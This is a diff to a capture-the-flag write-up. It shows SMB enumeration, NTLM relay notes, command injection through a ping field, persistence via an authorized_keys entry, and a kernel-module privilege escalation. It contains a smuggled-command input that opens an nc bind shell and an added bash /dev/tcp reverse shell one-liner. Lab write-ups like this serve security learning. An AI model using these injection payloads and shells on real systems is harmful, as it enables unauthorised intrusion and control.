@@ -20,7 +20,7 @@ When signing isn't required SMB traffic is vulnerable to interception and NTLM r
 
 Can I impersonate an active user? Or an admin account?
 
-**NTLM relay attacks**: Unsigned SMB traffic allows attackers to cature NTLM hashes and authenticate to other systems without knowing the passwords.
+**NTLM relay attacks**: Unsigned SMB traffic allows attackers to capture NTLM hashes and authenticate to other systems without knowing the passwords.
 * So, if the traffic is unsigned via `not required`, I can use pass the hash. OR impersonate another account, since that message doesn't need to be signed with the secret. I can fake it.
 
 
@@ -200,7 +200,12 @@ Instead of making the target connect to me (`reverse shell`) I set up a listener
 ```HTTP
 ip=127.0.0.1+-c1$(nc+-lp+4445+-e+/bin/bash)
 ```
-This basically says "listen on this port and execute this command (/bin/bash) when someone connects".
+This basically says "listen on this port and execute this command (/bin/bash) when someone connects". This was used because my normal "goto" shell did not work for some reason, maybe I had a typo.
+
+"goto":
+```bash
+bash -c "bash -i >& /dev/tcp/ip/port 0>&1"
+```
 
 
 And I connect with:
@@ -353,7 +358,7 @@ aecd<REDACTED>0bd48
 1. Enumerate the public SMB shares, one contained a reference to a PING tool at a certain URL.
 2. Obtain RCE through the ping field by escaping the command field.
 3. Gain access to the account `athena` by injecting malicious code into their backup script.
-4. Maintain persistence by fetching the private `id_rsa` key. 
+4. Maintain persistence by adding my pubkey to authorized_keys. 
 5. See that we can load a malicious module into the kernel with `sudo insmod <path_to_module>`.
 6. Transfer the binary to my machine and inspect it with Ghidra.
 7. Find that the process `kill` can be replaced with a malicious `hacked_kill` that when supplied the correct flags, hides itself and gives root access.
